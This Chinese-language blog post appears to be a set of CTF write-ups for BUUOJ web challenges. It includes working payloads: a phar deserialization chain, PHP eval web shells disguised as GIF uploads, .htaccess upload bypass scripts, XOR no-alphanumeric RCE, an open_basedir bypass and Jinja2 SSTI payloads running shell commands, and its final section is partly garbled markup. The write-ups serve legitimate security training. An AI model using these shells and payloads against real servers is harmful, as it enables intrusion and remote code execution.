src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330164535408.png" alt="image-20220330164535408"></p><p>成功获得flag</p><h2 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h2><p>点击查看文件</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=</code></pre><p>观察url，很可能是文件包含，读取下各个文件源码</p><p>index.php</p><pre><code class="php">&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;base.php&#39;;?&gt; </code></pre><p>base.php</p><pre><code class="php">&lt;?php     session_start(); ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt;     &lt;meta charset=&quot;utf-8&quot;&gt;     &lt;title&gt;web3&lt;/title&gt;     &lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css&quot;&gt;     &lt;script src=&quot;https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js&quot;&gt;&lt;/script&gt;     &lt;script src=&quot;https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js&quot;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;nav class=&quot;navbar navbar-default&quot; role=&quot;navigation&quot;&gt;         &lt;div class=&quot;container-fluid&quot;&gt;         &lt;div class=&quot;navbar-header&quot;&gt;             &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;首页&lt;/a&gt;         &lt;/div&gt;             &lt;ul class=&quot;nav navbar-nav navbra-toggle&quot;&gt;                 &lt;li class=&quot;active&quot;&gt;&lt;a href=&quot;file.php?file=&quot;&gt;查看文件&lt;/a&gt;&lt;/li&gt;                 &lt;li&gt;&lt;a href=&quot;upload_file.php&quot;&gt;上传文件&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;             &lt;ul class=&quot;nav navbar-nav navbar-right&quot;&gt;                 &lt;li&gt;&lt;a href=&quot;index.php&quot;&gt;&lt;span class=&quot;glyphicon glyphicon-user&quot;&gt;&lt;/span&gt;&lt;?php echo $_SERVER[&#39;REMOTE_ADDR&#39;];?&gt;&lt;/a&gt;&lt;/li&gt;             &lt;/ul&gt;         &lt;/div&gt;     &lt;/nav&gt; &lt;/body&gt; &lt;/html&gt; &lt;!--flag is in f1ag.php--&gt;</code></pre><p>file.php</p><pre><code class="php">首页    查看文件    上传文件    10.244.80.46&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;);  include &#39;function.php&#39;; include &#39;class.php&#39;; ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); $file = $_GET[&quot;file&quot;] ? $_GET[&#39;file&#39;] : &quot;&quot;; if(empty($file)) &#123;     echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123;     $show-&gt;source = $file;     $show-&gt;_show(); &#125; else if (!empty($file))&#123;     die(&#39;file doesn\&#39;t exists.&#39;); &#125; ?&gt;  </code></pre><p>upload_file.php</p><pre><code class="php">222.90.67.205&lt;?php include &#39;function.php&#39;; upload_file(); ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charest=&quot;utf-8&quot;&gt; &lt;title&gt;文件上传&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div align = &quot;center&quot;&gt;         &lt;h1&gt;前端写得很low,请各位师傅见谅!&lt;/h1&gt; &lt;/div&gt; &lt;style&gt;     p&#123; margin:0 auto&#125; &lt;/style&gt; &lt;div&gt; &lt;form action=&quot;upload_file.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;     &lt;label for=&quot;file&quot;&gt;文件名:&lt;/label&gt;     &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;     &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt; &lt;/div&gt; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;</code></pre><p>function.php</p><pre><code class="php">222.90.67.205&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123;     global $_FILES;     $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;;     //mkdir(&quot;upload&quot;,0777);     if(file_exists(&quot;upload/&quot; . $filename)) &#123;         unlink($filename);     &#125;     move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename);     echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#39;; &#125; function upload_file() &#123;     global $_FILES;     if(upload_file_check()) &#123;         upload_file_do();     &#125; &#125; function upload_file_check() &#123;     global $_FILES;     $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;);     $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]);     $extension = end($temp);     if(empty($extension)) &#123;         //echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;;     &#125;     else&#123;         if(in_array($extension,$allowed_types)) &#123;             return true;         &#125;         else &#123;             echo &#39;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#39;;             return false;         &#125;     &#125; &#125; ?&gt; </code></pre><p>class.php</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;    public function __construct($name)    &#123;        $this-&gt;str = $name;    &#125;    public function __destruct()    &#123;        $this-&gt;test = $this-&gt;str;        echo $this-&gt;test;    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __construct($file)    &#123;        $this-&gt;source = $file;   //$this-&gt;source = phar://phar.jpg        echo $this-&gt;source;    &#125;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;    public function __set($key,$value)    &#123;        $this-&gt;$key = $value;    &#125;    public function _show()    &#123;        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&gt;source)) &#123;            die(&#39;hacker!&#39;);        &#125; else &#123;            highlight_file($this-&gt;source);        &#125;            &#125;    public function __wakeup()    &#123;        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;            echo &quot;hacker~&quot;;            $this-&gt;source = &quot;index.php&quot;;        &#125;    &#125;&#125;class Test&#123;    public $file;    public $params;    public function __construct()    &#123;        $this-&gt;params = array();    &#125;    public function __get($key)    &#123;        return $this-&gt;get($key);    &#125;    public function get($key)    &#123;        if(isset($this-&gt;params[$key])) &#123;            $value = $this-&gt;params[$key];        &#125; else &#123;            $value = &quot;index.php&quot;;        &#125;        return $this-&gt;file_get($value);    &#125;    public function file_get($value)    &#123;        $text = base64_encode(file_get_contents($value));        return $text;    &#125;&#125;?&gt; </code></pre><p>我们是无法利用文件读取来读取flag的。class.php一看就是反序列化，但是所有的代码里面都没有unserialize方法。有文件上传点，且phar协议没有过滤，那么就应该考察的是利用phar协议来进行反序列化逃逸，那我们就要尝试来构造poc链。</p><p>首先确定终点，它应该是可以读取文件的一个方法，我们锁定file_get方法</p><pre><code>$text = base64_encode(file_get_contents($value));</code></pre><p>我们就可以向这个方法中传入我们需要读取的文件路径就可以了。</p><p>思路:</p><pre><code>对象销毁，调用__destruct()方法，最后会echo一个值，令$C1e4r-&gt;str=$Show,这样就会调用show对象的__toString()方法，再令$Show-&gt;str[&#39;str&#39;]=$Test,test对象中并没有source，所以会调用get方法，令Test-&gt;params[source] = &quot;/var/www/html/f1ag.php&quot;,就可以成功读取flag</code></pre><p>poc链</p><pre><code class="php">&lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;    public function __toString()    &#123;        $content = $this-&gt;str[&#39;str&#39;]-&gt;source;        return $content;    &#125;&#125;class Test&#123;    public $file;    public $params;&#125;$c1e4r = new C1e4r();$show = new Show();$test = new Test();$c1e4r-&gt;str = $show;$show-&gt;str[&#39;str&#39;]=$test;$test-&gt;params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;;$phar = new Phar(&quot;sakura.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt;setMetadata($c1e4r);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;</code></pre><p>在本地搭建php环境，然后访问，会生成一个phar文件</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214617285.png" alt="image-20220330214617285"></p><p>接下来要把这个文件上传到目标服务器，但是只允许图片进行上传</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330214739536.png" alt="image-20220330214739536"></p><p>所以我们把后缀改为.gif，这并不会影响phar文件的解析</p><p>接下来要得到我们上传文件的路径</p><pre><code>$filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); </code></pre><p>对文件名和远程地址进行md5加密，后缀加上jpg，由此得到文件名</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220208000.png" alt="image-20220330220208000"></p><pre><code>0b0c73463194f72e78079b81d921c8f4.jpg路径为:xxx/upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220359594.png" alt="image-20220330220359594"></p><p>payload</p><pre><code>http://2895a638-1834-4f93-8e10-962056e63a83.node4.buuoj.cn:81/file.php?file=phar://upload/0b0c73463194f72e78079b81d921c8f4.jpg</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220521789.png" alt="image-20220330220521789"></p><p>解密一下</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220330220555486.png" alt="image-20220330220555486"></p><h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>简单文件上传，进去后注册账号，登录。</p><p>可以直接上传PHP文件</p><p>ma.php</p><pre><code>GIF89a&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;x&#39;]);&lt;/script&gt;</code></pre><p>然后复制图片链接，到蚁剑中连接</p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141935935.png" alt="image-20220331141935935"></p><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331141947473.png" alt="image-20220331141947473"></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331142206699.png" alt="image-20220331142206699"></p><p>查看源代码</p><pre><code class="php"> &lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) &#123;  show_source(__FILE__);  exit();&#125;function is_valid($str) &#123;  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) &#123;    return false;  &#125;  return true;&#125;$body = file_get_contents(&#39;php://input&#39;); #body获取post数据,后面会对这进行$json = json_decode($body, true); #对获取得数据进行解码if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) &#123; #判断body是否有效，是否存在json数据，是否存在json[&#39;page&#39;]数据   $page = $json[&#39;page&#39;];  $content = file_get_contents($page); #读取page中得内容  if (!$content || !is_valid($content)) &#123;    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  &#125;&#125; else &#123;  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;&#125;// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\&#123;.+\&#125;/i&#39;, &#39;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#39;, $content);#匹配过滤关键字ctfecho json_encode([&#39;content&#39; =&gt; $content]); #将content进行json编码并输出</code></pre><p>在json中，字符Unicode编码之后等同于该字符，比如php等同于\u0070\u0068\u0070。</p><p>构造payload</p><pre><code>php://filter/read=convert.base64-encode/resource=/flag</code></pre><p>编码下</p><pre><code>\u0070\u0068\u0070://filter/read=convert.base64-encode/resource=/\u0066\u006c\u0061\u0067</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331161734671.png" alt="image-20220331161734671"></p><p>解码</p><pre><code>flag&#123;06495870-7a10-4628-b799-e860b1b58477&#125;</code></pre><h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><pre><code class="php">&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123;    if(preg_match(&quot;/&#39;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;        // if(preg_match(&quot;/&#39;| |_|=|php/&quot;,$input))&#123;        die(&#39;hacker!!!&#39;);    &#125;else&#123;        return $input;    &#125;&#125;function waf($input)&#123;  if(is_array($input))&#123;      foreach($input as $key=&gt;$output)&#123;          $input[$key] = waf($output);      &#125;  &#125;else&#123;      $input = check($input);  &#125;&#125;$dir = &#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;;if(!file_exists($dir))&#123;    mkdir($dir);&#125;switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;    case &#39;pwd&#39;:        echo $dir;        break;    case &#39;upload&#39;:        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;        waf($data);        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);&#125;?&gt;</code></pre><p>代码审计</p><p><code>$a ?? 0 等同于 isset($a) ? $a : 0。</code></p><p>首先爆出路径</p><pre><code class="php">http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=pwd/sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331214929182.png" alt="image-20220331214929182"></p><p>这道题考察的就是shell的写入，但是它过滤了不少关键词</p><p>其中过滤了php这个关键词，但是这个可以进行绕过</p><pre><code>PHP中有两种短标签，&lt;??&gt;和&lt;?=?&gt;。其中，&lt;??&gt;相当于对&lt;?php&gt;的替换。而&lt;?=?&gt;则是相当于&lt;? echo&gt;大部分文章说短标签需要在php.ini中设置short_open_tag为on才能开启短标签(默认是开启的，但似乎又默认注释，所以还是等于没开启)。但实际上在PHP5.4以后，无论short_open_tag是否开启，&lt;?=?&gt;这种写法总是适用的，&lt;??&gt;这种写法则需要short_open_tag开启才行。</code></pre><pre><code>过滤了空格‘ ’可以用 \t或者%09(需要php环境) 代替</code></pre><p>构造payload</p><pre><code>http://f6e38646-bc70-457d-9523-4bfbda2e6c4f.node4.buuoj.cn:81?action=upload&amp;data=&lt;?=%09`cat%09/*`?&gt;</code></pre><p><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220331225308163.png" alt="image-20220331225308163"></p><h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><pre><code class="php">&lt;?phpfunction get_the_flag()&#123;    // webadmin will remove your upload file every 20 min!!!!     $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);    if(!file_exists($userdir))&#123;    mkdir($userdir);    &#125;    if(!empty($_FILES[&quot;file&quot;]))&#123;        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);    if(preg_match(&quot;/ph/i&quot;,$extension)) die(&quot;^_^&quot;);         if(mb_strpos(file_get_contents($tmp_name), &#39;&lt;?&#39;)!==False) die(&quot;^_^&quot;);    if(!exif_imagetype($tmp_name)) die(&quot;^_^&quot;);         $path= $userdir.&quot;/&quot;.$name;        @move_uploaded_file($tmp_name, $path);        print_r($path);    &#125;&#125;$hhh = @$_GET[&#39;_&#39;];if (!$hhh)&#123;    highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123;    die(&#39;One inch long, one inch strong!&#39;);&#125;if ( preg_match(&#39;/[\x00- 0-9A-Za-z\&#39;&quot;\`~_&amp;.,|=[\x7F]+/i&#39;, $hhh) )    die(&#39;Try something else!&#39;);$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die(&quot;Almost there!&quot;);eval($hhh);?&gt;</code></pre><p>代码审计</p><p>源码贴上来：</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150538110.png" alt="image-20220210150538110"></a></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150849473.png" alt="image-20220210150849473"></a></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210150949879.png" alt="image-20220210150949879"></a></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code>&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><a href="https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png"><img src="/2022/03/28/ctf%E5%88%B7%E9%A2%98-%E7%AC%AC%E4%B8%80%E5%91%A8%E9%A2%98%E7%9B%AE/image-20220210151113658.png" alt="image-20220210151113658"></a></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=phpinfo```[![image-20220210152555350](ctf刷题-第一周题目/image-20220210152555350.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png)成功出来phpinfo，看一看有没有可以利用的点[![image-20220210152650640](ctf刷题-第一周题目/image-20220210152650640.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png)发现执行系统的命令全被禁用了，看来rce走不通了。这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了[![image-20220210152821670](ctf刷题-第一周题目/image-20220210152821670.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png)不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。既然rce走不通，那就试一试文件上传吧[![image-20220210152933281](ctf刷题-第一周题目/image-20220210152933281.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png)各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。但是上传.htaccess仍然有[![image-20220210204915083](ctf刷题-第一周题目/image-20220210204915083.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png)这个函数限制。解决这个函数，采用xbm格式，X Bit Map```在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;```在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。所以我们在.htaccess里加上```#define width 1337#define height 1337..........```就可以绕过绕过这个函数了。上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对<?进行了检测。这里有两种方法可以绕过。1、对一句话木马的内容进行base64编码。2、使用 utf-16be 来绕过下面先附上两种方法的exp：1、```import requestsimport base64htaccess = b"""#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""shell = b"GIF89a12" + base64.b64encode(b"<?php eval($_REQUEST['cmd']);?>")#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = "http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&%86=get_the_flag"files = &#123;'file':('.htaccess',htaccess,'image/jpeg')&#125;data = &#123;"upload":"Submit"&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;'file':('shell.ahhh',shell,'image/jpeg')&#125;response = requests.post(url=url, data=data, files=files)print(response.text)```本题php环境为7.2，所以无法使用`<script language="php">eval($_REQUEST['shell']);</script>`这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。得到[![image-20220210212049717](ctf刷题-第一周题目/image-20220210212049717.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png)2、```SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"def generate_php_file(filename, script):    phpfile = open(filename, 'wb')     phpfile.write(script.encode('utf-16be'))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open('.htaccess', 'wb')    htaccess.write(SIZE_HEADER)    htaccess.write(b'AddType application/x-httpd-php .lethe\n')    htaccess.write(b'php_value zend.multibyte 1\n')    htaccess.write(b'php_value zend.detect_unicode 1\n')    htaccess.write(b'php_value display_errors 1\n')    htaccess.close()        generate_htacess()generate_php_file("shell.lethe", "<?php eval($_GET['cmd']); die(); ?>")```同理上传即可[![image-20220210212639842](ctf刷题-第一周题目/image-20220210212639842.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png)一句话木马成功利用。使用蚁剑成功连接[![image-20220210212824536](ctf刷题-第一周题目/image-20220210212824536.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png)但是无法访问根目录。非预期解：采用蚁剑自带插件进行绕过.[![image-20220210213427872](ctf刷题-第一周题目/image-20220210213427872.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png)预期解：绕过open_basedir这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。```chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));```[![image-20220210214135619](ctf刷题-第一周题目/image-20220210214135619.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png)所有文件被列举出来了，下面读取flag值就可以了。[![image-20220210214447849](ctf刷题-第一周题目/image-20220210214447849.png)](https://sakurahack-y.github.io/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png)## [RootersCTF2019]I_<3_Flask 10 11 15 2021 2022 这道题是模板注入。 [![image-20220211102608147](ctf刷题-第一周题目 image-20220211102608147.png)](https: sakurahack-y.github.io 02 rootersctf2019-i-3-flask-0x70-0x7f image-20220211102608147.png) 首先查看源代码，并没有什么用。 [![image-20220211102910418](ctf刷题-第一周题目 image-20220211102910418.png)](https: image-20220211102910418.png) dirsearch爆破一下，什么也没有。 [![image-20220211102929099](ctf刷题-第一周题目 image-20220211102929099.png)](https: image-20220211102929099.png) 本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。 我们这里采用arjun工具进行爆破。工具链接：https: github.com s0md3v arjun [![image-20220211110028885](ctf刷题-第一周题目 image-20220211110028885.png)](https: image-20220211110028885.png)最终可爆破出来参数name。 [![image-20220211105238512](ctf刷题-第一周题目 image-20220211105238512.png)](https: image-20220211105238512.png) [![image-20220211105250064](ctf刷题-第一周题目 image-20220211105250064.png)](https: image-20220211105250064.png) 测试了一下的确存在模板注入。 接下来就是对漏洞的利用。 **漏洞利用** **1、工具tplmap** [![image-20220211110242684](ctf刷题-第一周题目 image-20220211110242684.png)](https: image-20220211110242684.png) [![image-20220211110254561](ctf刷题-第一周题目 image-20220211110254561.png)](https: image-20220211110254561.png) 成功，发现为jinja2模板，在ctf题目中经常考察 直接–os-shell拿下shell，读取flag [![image-20220211110436293](ctf刷题-第一周题目 image-20220211110436293.png)](https: image-20220211110436293.png) **2、手工利用** 只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。 具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。 [https: ssti-flak%e6%a1%86%e6%9e%b6 ](https: ssti-flak框架 ) 首先给几个比较通用的payload ``` http: b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81 ?name="&#123;%" for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__="='catch_warnings'" %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif endfor %&#125; [![image-20220211111654284](ctf刷题-第一周题目 image-20220211111654284.png)](https: image-20220211111654284.png) [].__class__.__base__.__subclasses__() &#123;% 'catch_warnings' b c.__init__.__globals__.values() b.__class__="=" &#123;&#125;.__class__ 'eval' b.keys() &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125; < code></3_Flask></code></pre><p><a href="https://sakurahack-y.github.io/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png"><img 